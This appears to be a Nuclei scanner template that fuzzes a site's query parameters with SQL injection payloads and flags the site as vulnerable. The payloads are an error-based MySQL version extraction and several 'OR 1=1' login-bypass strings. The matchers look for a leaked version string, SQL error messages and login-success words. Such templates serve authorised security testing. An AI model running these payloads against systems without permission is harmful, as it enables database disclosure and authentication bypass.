id: nawab-confirmed-sqli

info:
  name: ⚡ Nawab-Confirmed-SQLi ⚡
  author: thenawabx
  severity: critical

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    payloads:
      sqli_payloads:
        - "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)--"
        - "' OR 1=1 --"
        - "%27%20OR%201%3D1%20--"
        - "') OR 1=1--"
        - "\"' OR 1=1--"

    fuzzing:
      - part: query
        type: replace
        fuzz:
          - "{{sqli_payloads}}"

    matchers-condition: or
    matchers:
      - type: regex
        name: database-version
        part: body
        regex:
          - "~[0-9]+\\.[0-9]+\\.[a-zA-Z0-9-~]+"

      - type: word
        name: login-success-indicators
        words:
          - "dashboard"
          - "profile"
          - "logout"
          - "welcome"
        part: body
        condition: or

      - type: word
        name: sql-error-strings
        words:
          - "SQL syntax"
          - "mysql_fetch_array"
          - "ORA-00933"
          - "PostgreSQL query failed"
          - "SQLite3::query"
        part: body
        condition: or
